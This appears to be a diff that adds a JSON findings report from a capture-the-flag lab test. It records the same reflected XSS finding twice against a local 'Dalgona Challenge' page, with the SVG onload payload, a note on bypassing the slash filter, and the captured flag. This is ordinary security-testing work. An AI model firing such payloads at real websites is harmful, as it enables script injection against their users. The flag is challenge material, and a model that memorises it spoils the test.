@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T14:17:56.367786+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "50bd01f3-9a78-491f-8a5f-ec07d7542659",
+      "timestamp": "2026-04-14T14:17:56.367697+00:00",
+      "title": "Reflected XSS in Dalgona Challenge",
+      "severity": "high",
+      "target": "http://172.17.0.1:38887/page",
+      "description": "The 'name' parameter on /page is vulnerable to reflected Cross-Site Scripting (XSS). The application strips forward slashes from input but allows event handler attributes like 'onload' on SVG elements, enabling XSS execution.",
+      "evidence": "flag{ad00f199-e499-4836-b75a-7e2b7842aa59}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<svg onload=alert('XSS')>",
+        "expected": "Success response with flag displayed"
+      }
+    },
+    {
+      "id": "5549acb1-4595-436d-9012-5560962ebbd3",
+      "timestamp": "2026-04-14T14:17:56.449719+00:00",
+      "title": "Reflected XSS in Dalgona Challenge",
+      "severity": "high",
+      "target": "http://172.17.0.1:38887/page",
+      "description": "The 'name' parameter on /page is vulnerable to reflected Cross-Site Scripting (XSS). The application strips forward slashes from input but allows event handler attributes like 'onload' on SVG elements, enabling XSS execution.",
+      "evidence": "flag{ad00f199-e499-4836-b75a-7e2b7842aa59}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /page?name=<svg onload=alert('XSS')>",
+        "expected": "Success response with flag displayed"
+      }
+    }
+  ],
+  "diagrams": []
+}
